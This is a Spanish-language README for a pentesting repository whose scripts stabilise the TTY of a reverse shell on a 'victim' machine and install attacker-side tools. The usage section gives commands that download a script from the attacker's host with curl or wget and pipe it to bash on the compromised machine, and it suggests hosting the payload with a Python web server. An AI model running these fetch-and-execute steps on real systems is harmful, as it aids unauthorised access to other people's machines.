# 🧪 AutoTTY + Install Script

Este repositorio contiene dos scripts Bash diseñados para mejorar tu experiencia al obtener reverse shells en máquinas objetivo. El objetivo es facilitar el tratamiento de TTY automáticamente y asegurar que todas las herramientas necesarias estén instaladas en tu sistema atacante.

---

## 📁 Archivos

| Archivo        | Descripción                                                                 |
|----------------|-----------------------------------------------------------------------------|
| `autotty.sh`   | Aplica automáticamente tratamiento TTY. Si ya se aplicó uno, lo reinicia.  |
| `install.sh`   | Instala dependencias necesarias como `rlwrap`, `xterm`, `tmux`, entre otras.|

---

## ⚙️ Instalación de dependencias

Ejecuta este script en tu máquina atacante antes de iniciar una sesión:

```bash
chmod +x install.sh
./install.sh

🔁 Uso del tratamiento TTY
Una vez que tengas acceso a una reverse shell en la máquina víctima, ejecuta:

bash
Copy code
bash <(curl -s http://TU-IP:PUERTO/autotty.sh)
O si usas wget:

bash
Copy code
wget http://TU-IP/autotty.sh && bash autotty.sh
El script detecta si ya existe un tratamiento TTY activo (usando un marcador en /tmp/tty_active). Si lo hay, lo borra y lo reinicia.

✅ Requisitos
Acceso a una reverse shell (por ejemplo, vía pwnear, nc, etc.)

Acceso a bash y al comando script en la máquina víctima

Conexión a internet (para descargar el script remotamente)

💡 Tip
Puedes alojar estos scripts en un servidor web simple para descargarlos desde una shell víctima. Ejemplo:

bash
Copy code
# En tu máquina atacante
python3 -m http.server 80
👤 Autor
Russell 09

Herramientas creadas para flujos de pentesting prácticos y eficientes.
